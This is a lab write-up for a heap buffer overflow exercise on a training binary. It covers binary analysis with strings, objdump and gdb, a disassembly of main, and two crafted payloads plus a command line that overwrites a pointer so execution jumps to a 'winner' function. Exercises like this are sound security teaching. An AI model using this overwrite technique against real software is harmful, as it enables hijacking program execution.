# ex11 README

## Objective

The goal of this exercise is to exploit a heap-based buffer overflow to redirect code execution and print the message "and we have a winner @ <'value'>".

### Steps to Achieve the Objective

1. **Analyze the Binary**:

    - Use tools like `strings`, `objdump`, and `gdb` to understand the binary.
    - Identify key functions, memory allocations, and potential vulnerabilities.
2. **Determine Function Addresses**:

    - Find the address of the `winner` function.
3. **Understand Memory Allocation and Structure**:

    - Use `malloc` to allocate memory for structures.
    - Use `strcpy` to copy data into these allocated buffers.
    - Identify how pointers are manipulated and stored in the allocated memory.
4. **Craft Payloads**:

    - Create payloads that overwrite function pointers to redirect execution to the `winner` function.
5. **Execute the Payloads**:

    - Run the binary with the crafted payloads as arguments to achieve the desired output.

### Step-by-Step Guide

#### 1\. Initial Analysis

Start by using `strings` to get an overview of the binary:


```sh
strings bin
```

Key output:

```plaintext
and we have a winner @ %d
and that's a wrap folks!
```

#### 2\. Identify Function Addresses

Use `objdump` to find the address of the `winner` function:

```sh
objdump -t bin | grep win
```

Key output:

```plaintext
08048494 g     F .text  00000025              winner
```

The address of the `winner` function is `0x08048494`.

#### 3\. Analyze Memory Layout

Use `gdb` to disassemble the `main` function and set breakpoints to understand memory allocations and pointer manipulations:

```sh
gdb -q ./bin
(gdb) break main
(gdb) run AAAA BBBB
(gdb) disassemble main
```

Key disassembly output:

```plaintext
 0x080484b9 <+0>:     push   %ebp
   0x080484ba <+1>:     mov    %esp,%ebp
   0x080484bc <+3>:     and    $0xfffffff0,%esp
   0x080484bf <+6>:     sub    $0x20,%esp
   0x080484c2 <+9>:     int3
   0x080484c3 <+10>:    add    $0x24,%al
   0x080484c5 <+12>:    or     %al,(%eax)
   0x080484c7 <+14>:    add    %al,(%eax)
   0x080484c9 <+16>:    call   0x80483bc <malloc@plt>
   0x080484ce <+21>:    mov    %eax,0x14(%esp)
   0x080484d2 <+25>:    mov    0x14(%esp),%eax
   0x080484d6 <+29>:    movl   $0x1,(%eax)
   0x080484dc <+35>:    movl   $0x8,(%esp)
   0x080484e3 <+42>:    call   0x80483bc <malloc@plt>
   0x080484e8 <+47>:    mov    %eax,%edx
   0x080484ea <+49>:    mov    0x14(%esp),%eax
   0x080484ee <+53>:    mov    %edx,0x4(%eax)
   0x080484f1 <+56>:    movl   $0x8,(%esp)
   0x080484f8 <+63>:    call   0x80483bc <malloc@plt>
   0x080484fd <+68>:    mov    %eax,0x18(%esp)
   0x08048501 <+72>:    mov    0x18(%esp),%eax
   0x08048505 <+76>:    movl   $0x2,(%eax)
   0x0804850b <+82>:    movl   $0x8,(%esp)
   0x08048512 <+89>:    call   0x80483bc <malloc@plt>
   0x08048517 <+94>:    mov    %eax,%edx
   0x08048519 <+96>:    mov    0x18(%esp),%eax
   0x0804851d <+100>:   mov    %edx,0x4(%eax)
   0x08048520 <+103>:   mov    0xc(%ebp),%eax
   0x08048523 <+106>:   add    $0x4,%eax
   0x08048526 <+109>:   mov    (%eax),%eax
   0x08048528 <+111>:   mov    %eax,%edx
   0x0804852a <+113>:   mov    0x14(%esp),%eax
   0x0804852e <+117>:   mov    0x4(%eax),%eax
   0x08048531 <+120>:   mov    %edx,0x4(%esp)
   0x08048535 <+124>:   mov    %eax,(%esp)
   0x08048538 <+127>:   call   0x804838c <strcpy@plt>
   0x0804853d <+132>:   mov    0xc(%ebp),%eax
   0x08048540 <+135>:   add    $0x8,%eax
   0x08048543 <+138>:   mov    (%eax),%eax
   0x08048545 <+140>:   mov    %eax,%edx
   0x08048547 <+142>:   mov    0x18(%esp),%eax
   0x0804854b <+146>:   mov    0x4(%eax),%eax
   0x0804854e <+149>:   mov    %edx,0x4(%esp)
   0x08048552 <+153>:   mov    %eax,(%esp)
   0x08048555 <+156>:   call   0x804838c <strcpy@plt>
   0x0804855a <+161>:   movl   $0x804864b,(%esp)
   0x08048561 <+168>:   call   0x80483cc <puts@plt>
   0x08048566 <+173>:   leave
   0x08048567 <+174>:   ret
```

#### 4\. Identify Key Breakpoints

Set breakpoints to analyze the state of memory and registers after key points:

```sh
gdb -q ./bin
(gdb) break *main+21   # After first malloc
(gdb) break *main+47   # After second malloc
(gdb) break *main+68   # After third malloc
(gdb) break *main+127  # After first strcpy
(gdb) break *main+156  # After second strcpy
(gdb) run AAAA BBBB
```

#### 5\. Inspect Memory at Each Breakpoint

At each breakpoint, inspect the state of the stack and registers to understand how the heap allocations and pointers are set up:

```sh
(gdb) x/32x $esp
(gdb) info registers
(gdb) continue
```

### Payload Construction

Given the understanding from the memory layout and pointer manipulation:

1. **First Payload**:

    - `A` * 20 + `\x74\x97\x04\x08`
    - This payload fills 20 bytes of buffer and overwrites the pointer to point to the location where the second payload will write the `winner` function address.
2. **Second Payload**:

    - `\x94\x84\x04\x08`
    - This payload directly writes the address of the `winner` function to the location pointed to by the first payload.

### Execute the Payloads

Run the binary with the crafted payloads:

```sh
./bin $(python -c "print 'A'*20 + '\x74\x97\x04\x08'") $(python -c "print '\x94\x84\x04\x08'")
```

### Explanation of How It Works

1. **Heap Allocation**:

    - The program allocates memory on the heap for structures using `malloc`.
2. **Pointer Manipulation**:

    - The first payload overwrites a pointer in the first allocated structure to point to a specific location.
    - The second payload writes the address of the `winner` function to this location.
3. **Function Pointer Overwrite**:

    - By overwriting the function pointer, the program's execution is redirected to the `winner` function when it attempts to call the pointer.
4. **Execution Redirection**:

    - The program prints "and we have a winner @ <'value'>", indicating successful exploitation.

### Conclusion

By carefully analyzing the binary, understanding the memory layout, and crafting precise payloads, we successfully redirected execution to the `winner` function. This exercise demonstrated the importance of understanding heap-based buffer overflows and how to exploit them to manipulate program execution.

### Replication Steps

1. **Analyze the binary** with `strings`, `objdump`, and `gdb`.
2. **Identify function addresses** and key memory allocations.
3. **Set breakpoints** and inspect memory at key points.
4. **Craft payloads** to overwrite function pointers.
5. **Execute the payloads** as arguments to the binary.
6. **Verify the output** to ensure successful exploitation.

By following these steps, you can replicate the exploitation process and achieve the desired outcome of printing "and we have a winner @ <'value'>".
